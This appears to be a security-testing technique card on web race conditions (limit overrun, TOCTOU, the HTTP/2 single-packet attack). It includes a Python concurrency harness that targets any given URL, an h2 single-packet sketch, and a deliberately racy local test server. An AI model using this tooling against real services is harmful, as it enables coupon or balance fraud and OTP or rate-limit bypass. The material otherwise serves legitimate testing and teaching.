---
title: "Web Race Conditions - Limit Overrun, TOCTOU and the Single-Packet Attack"
category: web
subcategory: race
type: technique
tags: [race-condition, toctou, limit-overrun, single-packet-attack, http2, threading-barrier, double-spend, coupon, otp-bypass, turbo-intruder, last-byte-sync, concurrency, burp]
difficulty: medium
summary: "Hit a check-then-act window with many concurrent requests: limit overrun (redeem a coupon twice), TOCTOU, and the HTTP/2 single-packet attack to remove network jitter."
when_to_use:
  - "A one-time action (coupon, gift card, vote, withdrawal, OTP) with a check then a commit"
  - "A file is written then validated then deleted (race the deletion)"
  - "A counter/balance updated non-atomically across concurrent requests"
  - "Rate limits or 2FA that you can overrun by sending N requests simultaneously"
tools: [burp, turbo-intruder, python3]
related: [race-xsleaks, smuggling-http, graphql-attacks, node-parameter-pollution]
---

## TL;DR

Between a check ("is the coupon unused?") and the commit ("mark it used"), there is a window. Fire
many requests so they all pass the check before any commits, and the single-use action happens
N times. The hard part is landing the requests inside the window; the HTTP/2 single-packet
attack removes network jitter by delivering N requests in one TCP packet.

## Recognise it

- A non-idempotent action that should happen once: redeem code, apply discount, cast vote,
  withdraw balance, accept invite, claim username, submit flag-for-points.
- A "check then act" shape: `if (coupon.valid) { apply(); coupon.used = true; }`.
- File upload that is validated/scanned then deleted -- race a request to the file before
  deletion.
- OTP/2FA/password-reset with a limited number of attempts (overrun the limiter).
- "The flag is deleted after N reads" challenge framing.

## Theory

### The sub-state window

Most race bugs are a collision on a shared resource during a window where the app is in a
transient ("sub") state -- committed to acting but not yet recorded as having acted. Categories:

- **Limit overrun**: N successes where 1 is allowed (coupon stacking, double-spend, over-invite).
- **TOCTOU**: check a property, then use it, but it changed in between (file exists check ->
  symlink swap; balance check -> concurrent debit).
- **Multi-endpoint race**: two different endpoints touching the same object (add to cart +
  apply coupon; confirm email + change email).
- **Single-endpoint state race**: the same endpoint hit concurrently (increment a counter).
- **Partial construction**: an object is readable before it is fully initialised/authorised.
- **Time-sensitive**: two requests with the same timestamp collide on a uniqueness assumption.

### Landing requests in the window

Network jitter (each request arriving at a slightly different time) is the enemy. Techniques,
weakest to strongest:

1. **Threads + a barrier**: prepare all requests, block every thread on a `Barrier`, release
   together. Good enough for wide windows.
2. **Connection pre-warming**: open and TLS-handshake all connections first, so only the
   request bytes race.
3. **HTTP/1.1 last-byte sync**: send all but the final byte of each request, then flush the last
   bytes together over pre-warmed connections.
4. **HTTP/2 single-packet attack**: put N requests, each in its own stream, into **one TCP
   packet** by withholding the final frame of each stream (an empty DATA/HEADERS `END_STREAM`
   frame) and then flushing them together. All N arrive with near-zero jitter regardless of
   network conditions -- the current best method (James Kettle, 2023).

### Proving it

Two successes where the app permits one. A single anomalous 200 is not proof; show the balance
went negative, the coupon applied twice, or two accounts got the same unique name.

## Attack

1. Identify the single-use action and time a normal request (baseline latency, window guess).
2. Build 20-100 identical (or near-identical) requests.
3. Fire them synchronised: Burp Repeater "Send group in parallel" (uses single-packet for
   HTTP/2), Turbo Intruder with `engine.queue` + `gate`/`openGate`, or the harness below.
4. Tally by status/body; look for more successes than allowed.
5. If the window is tiny, escalate to single-packet (HTTP/2) or last-byte sync (HTTP/1.1).

## Code

```python
#!/usr/bin/env python3
"""Race-condition harness: threads + a Barrier, with a pluggable request
builder and result tallying.

The __main__ self-test spins up a local HTTP server with a DELIBERATE race
(a shared counter with a sleep between the check and the decrement) and proves
the harness observes more than one success -- fully hermetic, no external
network.
"""
from __future__ import annotations

import hashlib
import http.server
import sys
import threading
import time
import urllib.request
from collections import Counter
from dataclasses import dataclass


@dataclass
class Result:
    status: int
    body: str

    @property
    def key(self) -> str:
        return "%d:%s" % (self.status,
                          hashlib.sha1(self.body.encode()).hexdigest()[:8])


def race(build_request, n: int = 20, timeout: float = 10.0) -> list[Result]:
    """Fire n requests released simultaneously by a Barrier.

    build_request(i) -> urllib.request.Request (or a str URL).
    """
    barrier = threading.Barrier(n)
    results: list[Result | None] = [None] * n
    lock = threading.Lock()

    def worker(i: int) -> None:
        req = build_request(i)
        if isinstance(req, str):
            req = urllib.request.Request(req)
        barrier.wait()                    # all threads line up, then GO
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode("utf-8", "replace")
                r = Result(resp.status, body)
        except urllib.error.HTTPError as e:
            r = Result(e.code, e.read().decode("utf-8", "replace"))
        except Exception as e:            # noqa: BLE001
            r = Result(-1, str(e))
        with lock:
            results[i] = r

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return [r for r in results if r is not None]


def tally(results: list[Result]) -> Counter:
    return Counter(r.key for r in results)


def count_successes(results: list[Result], marker: str) -> int:
    return sum(1 for r in results if marker in r.body)


# --- single-packet-attack sketch (HTTP/2), for reference -------------------

SINGLE_PACKET_SKETCH = r'''
# Requires httpx[http2] + h2. Real single-packet attacks need low-level frame
# control (send HEADERS for every stream, withhold each stream's final DATA
# frame, then flush all final frames in one write). Burp Repeater's
# "Send group in parallel" and Turbo Intruder implement this properly; use them
# for production. Skeleton with h2:
import socket, ssl, h2.connection, h2.events
def single_packet(host, port, requests):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    sock = ctx.wrap_socket(socket.create_connection((host, port)),
                           server_hostname=host)
    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    stream_bodies = {}
    for method, path, headers, body in requests:
        sid = conn.get_next_available_stream_id()
        hdrs = [(":method", method), (":path", path),
                (":authority", host), (":scheme", "https")] + headers
        # send headers WITHOUT end_stream so the request is incomplete
        conn.send_headers(sid, hdrs, end_stream=False)
        stream_bodies[sid] = body
    sock.sendall(conn.data_to_send())     # all headers out, no bodies yet
    # now flush every final frame together -> one packet, minimal jitter
    for sid, body in stream_bodies.items():
        conn.send_data(sid, body.encode(), end_stream=True)
    sock.sendall(conn.data_to_send())     # THE synchronised flush
    # ... read responses ...
'''


# --- a deliberately-racy local server for the self-test --------------------

class _RacyState:
    def __init__(self, allowed: int = 1) -> None:
        self.remaining = allowed          # e.g. one coupon use
        self.granted = 0
        self.lock = threading.Lock()      # unused on purpose in vulnerable path


def _make_server(state: _RacyState, vulnerable: bool):
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            # CHECK
            if state.remaining > 0:
                # window between check and commit
                time.sleep(0.05)
                if vulnerable:
                    # non-atomic: many threads pass the check before any commit
                    state.remaining -= 1
                    state.granted += 1
                    ok = True
                else:
                    with state.lock:
                        if state.remaining > 0:
                            state.remaining -= 1
                            state.granted += 1
                            ok = True
                        else:
                            ok = False
            else:
                ok = False
            self.send_response(200 if ok else 429)
            self.end_headers()
            self.wfile.write(b"GRANTED" if ok else b"DENIED")

        def log_message(self, *a):
            pass

    return http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)


def _self_test() -> None:
    # 1. vulnerable server: the harness should observe > 1 GRANTED
    state = _RacyState(allowed=1)
    srv = _make_server(state, vulnerable=True)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        results = race(lambda i: "http://127.0.0.1:%d/redeem" % port, n=25)
        granted = count_successes(results, "GRANTED")
        t = tally(results)
        assert len(results) == 25
        assert granted > 1, ("expected an overrun, got %d GRANTED (tally=%s)"
                             % (granted, dict(t)))
        assert state.granted == granted   # server agrees it over-granted
    finally:
        srv.shutdown()

    # 2. fixed (locked) server: at most 1 GRANTED even under the same race
    state2 = _RacyState(allowed=1)
    srv2 = _make_server(state2, vulnerable=False)
    port2 = srv2.server_address[1]
    threading.Thread(target=srv2.serve_forever, daemon=True).start()
    try:
        results2 = race(lambda i: "http://127.0.0.1:%d/redeem" % port2, n=25)
        granted2 = count_successes(results2, "GRANTED")
        assert granted2 == 1, "atomic server leaked %d grants" % granted2
    finally:
        srv2.shutdown()

    # 3. tally keys group identical responses
    rs = [Result(200, "GRANTED"), Result(200, "GRANTED"), Result(429, "DENIED")]
    tt = tally(rs)
    assert sum(tt.values()) == 3 and len(tt) == 2

    assert "single_packet" in SINGLE_PACKET_SKETCH   # reference sketch present

    print("[ok] harness observed %d grants on the racy server (limit 1), "
          "and 1 on the fixed server" % granted)


if __name__ == "__main__":
    if len(sys.argv) > 2:
        url = sys.argv[1]
        n = int(sys.argv[2])
        for k, c in tally(race(lambda i: url, n=n)).most_common():
            print("%4d x %s" % (c, k))
    else:
        _self_test()
```

## Variants & pitfalls

- **Wide vs narrow windows**: threads+barrier handle windows of tens of milliseconds; sub-ms
  windows need last-byte sync or single-packet.
- **HTTP/2 single-packet beats connection warming** because it removes per-request TCP/TLS
  variance entirely -- prefer Burp's "Send group in parallel" or Turbo Intruder for it.
- **Session/lock serialization**: if the app locks per session, use N different sessions/tokens,
  or find an endpoint that locks on the wrong key.
- **Idempotency keys / DB unique constraints** kill many races; look for the action that lacks
  them.
- **Rate-limit overrun** is a race too: many simultaneous OTP guesses can all pass the "attempts
  remaining" check before the counter decrements.
- **Multi-step races** (add-to-cart then checkout) need the two requests interleaved, not just
  duplicated -- Turbo Intruder's custom sequencing helps.
- **Proof discipline**: capture the anomalous state (negative balance, two identical unique
  values), not just repeated 200s.
- **Server thread pool size** limits real concurrency; if the pool is 1, no client-side trick
  helps.
- **Cleanup/nondeterminism**: races are probabilistic -- repeat, and increase N, before
  concluding a target is safe.

## Tools

- Burp Repeater tab groups -> "Send group in parallel" (single-packet for HTTP/2).
- Turbo Intruder -- `engine.queue`, `gate`/`openGate`, `race-single-packet-attack.py` template.
- The harness above for scripted, hermetic testing.

## References

- James Kettle -- "Smashing the state machine: the true potential of web race conditions" (2023), single-packet attack.
- PortSwigger Web Security Academy -- Race conditions labs.
- OWASP -- Testing for Race Conditions.
